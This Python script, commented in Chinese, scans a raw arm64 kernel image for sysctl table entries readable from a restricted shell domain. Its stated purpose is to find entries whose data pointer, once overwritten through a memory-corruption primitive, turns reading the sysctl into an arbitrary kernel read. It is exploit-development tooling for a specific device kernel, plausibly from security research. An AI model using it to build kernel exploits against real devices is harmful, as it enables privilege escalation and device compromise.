#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ctls.py —— 在裸 Image 里**按 procname 字符串反查 ctl_table 条目**。

为什么这么做: 我们要找"shell 域真的读得到、且 handler 直接把 table->data 当数组解引用"
的 sysctl 条目 —— 一发形状(2)的指针写把 `.data` 改掉之后, `cat` 就变成一次任意内核读。
`/proc/sys/kernel/*`(含 ostype)对 shell 域是 EACCES(实测), 所以候选只能来自 /proc/sys/net/**。
条目没有稳定符号名(core_table/ipv4_table 是 static, 被优化进 .data 且不带符号),
所以唯一可靠的定位方式就是"procname 指向的那个字符串的地址"。

5.4 arm64 struct ctl_table: procname+0x00 data+0x08 maxlen+0x10 mode+0x14
                               child+0x18 proc_handler+0x20 (条目大小 0x30)
用法:
  python ctls.py names < readable_list.txt      # 从设备可读路径列表反查所有候选条目
  python ctls.py one  tcp_mem
"""
import io, os, re, struct, sys, bisect

BASE = 0xffffffc010080000
HERE = os.path.dirname(os.path.abspath(__file__))
IMG = os.path.join(HERE, '..', 'analysis', 'kernel_dev_g2a88cd145def.bin')
KS = os.path.join(HERE, '..', 'analysis', 'kallsyms_g2a88cd145def.txt')

data = io.open(IMG, 'rb').read()

syms = []
for line in io.open(KS, encoding='utf-8', errors='replace'):
    p = line.split()
    if len(p) >= 3 and re.fullmatch(r'[0-9a-f]{16}', p[0]):
        syms.append((int(p[0], 16), p[2]))
syms.sort()
addrs = [a for a, n in syms]


def name_of(a):
    i = bisect.bisect_right(addrs, a) - 1
    if i < 0:
        return None
    return '%s+0x%x' % (syms[i][1], a - syms[i][0])


def q8(off):
    return struct.unpack_from('<Q', data, off)[0]


def find_string(name):
    """返回镜像里所有以 NUL 结尾、恰好等于 name 的字符串地址。"""
    pat = b'\x00' + name.encode() + b'\x00'
    out, i = [], 0
    while True:
        j = data.find(pat, i)
        if j < 0:
            return out
        out.append(BASE + j + 1)
        i = j + 1


def scan(procname_addrs):
    """一遍全镜像 8 对齐扫描, 找出所有"值是某个 procname 地址"的 qword。"""
    want = {a: n for a, n in procname_addrs.items()}
    hits = []
    for off in range(0, len(data) - 8, 8):
        v = q8(off)
        n = want.get(v)
        if n:
            hits.append((BASE + off, n, off))
    return hits


def dump_entry(hit_addr, name):
    off = hit_addr - BASE
    e = [q8(off + k) for k in (0x00, 0x08, 0x10, 0x18, 0x20)]
    maxlen = e[2] & 0xffffffff
    mode = (e[2] >> 32) & 0xfff
    h = e[4]
    return dict(entry=hit_addr, name=name, data=e[1], maxlen=maxlen, mode=oct(mode),
                child=e[3], handler=h, hname=name_of(h) if h > 0xffffffc000000000 else None)


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'names'
    names = []
    if mode == 'one':
        names = [sys.argv[2]]
    else:
        seen = set()
        for line in io.open(sys.argv[2] if len(sys.argv) > 2 else 0, encoding='utf-8', errors='replace'):
            p = line.strip().split('|')
            if not p or not p[0]:
                continue
            b = os.path.basename(p[0])
            if b not in seen:
                seen.add(b)
                names.append(b)
    print('# %d 个候选名' % len(names), flush=True)
    pamap = {}
    for n in names:
        for a in find_string(n):
            pamap.setdefault(a, n)
    print('# %d 个字符串地址' % len(pamap), flush=True)
    hits = scan(pamap)
    print('# %d 个条目候选' % len(hits), flush=True)
    good = ('proc_dointvec', 'proc_doulongvec_minmax', 'proc_dointvec_minmax',
            'proc_dointvec_jiffies', 'proc_dointvec_ms_jiffies', 'proc_dointvec_userhz_jiffies')
    rows = []
    for a, n, off in hits:
        r = dump_entry(a, n)
        rows.append(r)
    rows.sort(key=lambda r: (-(r['maxlen'] or 0), r['name']))
    print('%-28s %-12s %8s %6s %-42s %s' % ('NAME', 'ENTRY', 'MAXLEN', 'MODE', 'HANDLER', 'DATA'))
    for r in rows:
        hn = (r['hname'] or '?')
        star = '*' if any(hn.startswith(g) for g in good) else ' '
        if r['maxlen'] >= 8 or star == '*':
            print('%s%-26s %08x %8d %6s %-42s %016x' % (star, r['name'], r['entry'], r['maxlen'],
                                                         r['mode'], hn[:42], r['data']))


main()
